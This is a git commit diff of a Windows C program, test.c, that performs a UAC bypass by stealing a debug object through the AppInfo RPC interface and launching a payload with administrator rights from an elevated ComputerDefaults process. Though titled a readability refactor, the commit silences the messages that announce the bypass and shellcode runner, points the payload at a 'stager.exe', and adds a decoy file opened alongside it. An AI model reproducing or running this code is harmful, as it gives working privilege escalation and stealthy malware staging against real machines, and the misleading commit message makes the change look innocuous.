3e6ebbca43f4f2e5147c13c78624b98de7326d8d
trieu12a22005 <trieu7a2005@gmail.com>
2026-05-06 01:58:40 +0700

    Refactor RAiLaunchAdminProcess and AicLaunchAdminProcess
    Refactor code for better readability and maintainability, including changes to function signatures and comments.

--- test.c
+++ test.c
@@ -19,7 +19,7 @@ typedef LONG NTSTATUS;
 typedef struct _UC_CONTEXT {
     WCHAR szSystemDirectory[MAX_PATH + 1];
     WCHAR szSystemRoot[MAX_PATH + 1];
-} UC_CONTEXT, *PUC_CONTEXT;
+} UC_CONTEXT, * PUC_CONTEXT;
 
 UC_CONTEXT g_ctx_struct;
 PUC_CONTEXT g_ctx = &g_ctx_struct;
@@ -50,13 +50,13 @@ static const appinfo_MIDL_PROC_FORMAT_STRING appinfo__MIDL_ProcFormatString = { 
 
 static const RPC_CLIENT_INTERFACE LaunchAdminProcess___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0x201ef99a,0x7fa0,0x444c,{0x93,0x99,0x19,0xba,0x84,0xf1,0x2a,0x1a}},{1,0}}, {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}}, 0, 0, 0, 0, 0, 0x00000000 };
 static RPC_BINDING_HANDLE LaunchAdminProcess__MIDL_AutoBindHandle;
-static const MIDL_STUB_DESC LaunchAdminProcess_StubDesc = { (void *)&LaunchAdminProcess___RpcClientInterface, NdrOleAllocate, NdrOleFree, &LaunchAdminProcess__MIDL_AutoBindHandle, 0, 0, 0, 0, appinfo__MIDL_TypeFormatString.Format, 1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0 };
+static const MIDL_STUB_DESC LaunchAdminProcess_StubDesc = { (void*)&LaunchAdminProcess___RpcClientInterface, NdrOleAllocate, NdrOleFree, &LaunchAdminProcess__MIDL_AutoBindHandle, 0, 0, 0, 0, appinfo__MIDL_TypeFormatString.Format, 1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0 };
 
-void RAiLaunchAdminProcess(PRPC_ASYNC_STATE AsyncHandle, handle_t hBinding, wchar_t *Path, wchar_t *Cmd, long SFlags, long CFlags, wchar_t *Dir, wchar_t *WSta, struct _APP_STARTUP_INFO *SInfo, unsigned __int3264 hWnd, long Tout, struct _APP_PROCESS_INFORMATION *PInfo, long *Elev) {
+void RAiLaunchAdminProcess(PRPC_ASYNC_STATE AsyncHandle, handle_t hBinding, wchar_t* Path, wchar_t* Cmd, long SFlags, long CFlags, wchar_t* Dir, wchar_t* WSta, struct _APP_STARTUP_INFO* SInfo, unsigned __int3264 hWnd, long Tout, struct _APP_PROCESS_INFORMATION* PInfo, long* Elev) {
     NdrAsyncClientCall((PMIDL_STUB_DESC)&LaunchAdminProcess_StubDesc, (PFORMAT_STRING)&appinfo__MIDL_ProcFormatString.Format[0], AsyncHandle, hBinding, Path, Cmd, SFlags, CFlags, Dir, WSta, SInfo, hWnd, Tout, PInfo, Elev);
 }
 
-BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show, APP_PROCESS_INFORMATION *PInfo) {
+BOOL AicLaunchAdminProcess(LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir, LPWSTR WSta, HWND hWnd, DWORD Tout, WORD Show, APP_PROCESS_INFORMATION* PInfo) {
     RPC_BINDING_HANDLE hBinding = NULL; RPC_ASYNC_STATE asyncState; RPC_STATUS status; RPC_SECURITY_QOS_V3 sqos; RPC_WSTR StringBinding = NULL; PSID LocalSystemSid = NULL; DWORD cbSid = SECURITY_MAX_SID_SIZE; APP_STARTUP_INFO appStartup = { 0 }; LONG elevationType = 0; VOID* Reply = NULL;
     status = RpcStringBindingComposeW((RPC_WSTR)APPINFO_RPC, L"ncalrpc", NULL, NULL, NULL, &StringBinding);
     status = RpcBindingFromStringBindingW(StringBinding, &hBinding);
@@ -96,7 +96,7 @@ NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
     si.StartupInfo.wShowWindow = SW_SHOW;
     si.StartupInfo.lpDesktop = (LPWSTR)T_DEFAULT_DESKTOP;
 
-    printf("[+] Spawning ConsoleApp1.exe WITH ADMIN RIGHTS...\n");
+    //printf("[+] Spawning ConsoleApp1.exe WITH ADMIN RIGHTS...\n");
     if (CreateProcessW(NULL, Payload, NULL, NULL, FALSE,
         CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
         NULL, g_ctx->szSystemRoot, (LPSTARTUPINFOW)&si, &pi)) {
@@ -104,7 +104,8 @@ NTSTATUS ucmxCreateProcessFromParent(HANDLE ParentProcess, LPWSTR Payload) {
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         status = STATUS_SUCCESS;
-    } else {
+    }
+    else {
         printf("[ERROR] CreateProcessW failed: %lu\n", GetLastError());
     }
     DeleteProcThreadAttributeList(si.lpAttributeList);
@@ -119,18 +120,18 @@ int main() {
     WCHAR szProcess[MAX_PATH * 2];
 
     // ==================== PAYLOAD C# ====================
-    WCHAR lpszPayload[] = L"C:\\update\\ConsoleApp1.exe";   // ← Đường dẫn bạn vừa cung cấp
+    WCHAR lpszPayload[] = L"C:\\Users\\LONGTRIEU\\stager.exe";   // ← Đường dẫn bạn vừa cung cấp
 
-    printf("--- UAC BYPASS + C# ShellcodeRunner STARTING ---\n");
+    //printf("--- UAC BYPASS + C# ShellcodeRunner STARTING ---\n");
 #ifdef _WIN64
-    printf("[CHECK] Architecture: x64\n");
+    //printf("[CHECK] Architecture: x64\n");
 #endif
 
     GetSystemDirectoryW(g_ctx->szSystemDirectory, MAX_PATH);
     GetWindowsDirectoryW(g_ctx->szSystemRoot, MAX_PATH);
 
     // PHASE 1
-    printf("[PHASE 1] Stealing Debug Object...\n");
+    //printf("[PHASE 1] Stealing Debug Object...\n");
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, WINVER_EXE);
     if (!AicLaunchAdminProcess(szProcess, szProcess, 0, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) {
         printf("[FAIL] Phase 1 failed.\n"); return 1;
@@ -141,7 +142,7 @@ int main() {
     CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);
 
     // PHASE 2
-    printf("[PHASE 2] Launching Elevated ComputerDefaults...\n");
+    //printf("[PHASE 2] Launching Elevated ComputerDefaults...\n");
     wcscpy(szProcess, g_ctx->szSystemDirectory); wcscat(szProcess, COMPUTERDEFAULTS_EXE);
     RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
     if (!AicLaunchAdminProcess(szProcess, szProcess, 1, CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, g_ctx->szSystemRoot, T_DEFAULT_DESKTOP, NULL, INFINITE, SW_HIDE, &procInfo)) {
@@ -155,6 +156,14 @@ int main() {
             nt = NtDuplicateObject(dbgProcessHandle, GetCurrentProcess(), GetCurrentProcess(), &dupHandle, PROCESS_ALL_ACCESS, 0, 0);
             if (nt == STATUS_SUCCESS) {
                 ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                ShellExecuteW(
+                    NULL,
+                    L"open",
+                    L"C:\\test\\xinchao.txt", // Đường dẫn file của bạn
+                    NULL,
+                    NULL,
+                    SW_SHOWNORMAL
+                );
                 NtClose(dupHandle);
             }
             ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
@@ -173,6 +182,6 @@ int main() {
     TerminateProcess((HANDLE)procInfo.ProcessHandle, 0);
     CloseHandle((HANDLE)procInfo.ThreadHandle); CloseHandle((HANDLE)procInfo.ProcessHandle);
 
-    printf("--- DONE - Shellcode đang chạy với quyền ADMIN ---\n");
+    //printf("--- DONE - Shellcode đang chạy với quyền ADMIN ---\n");
     return 0;
 }
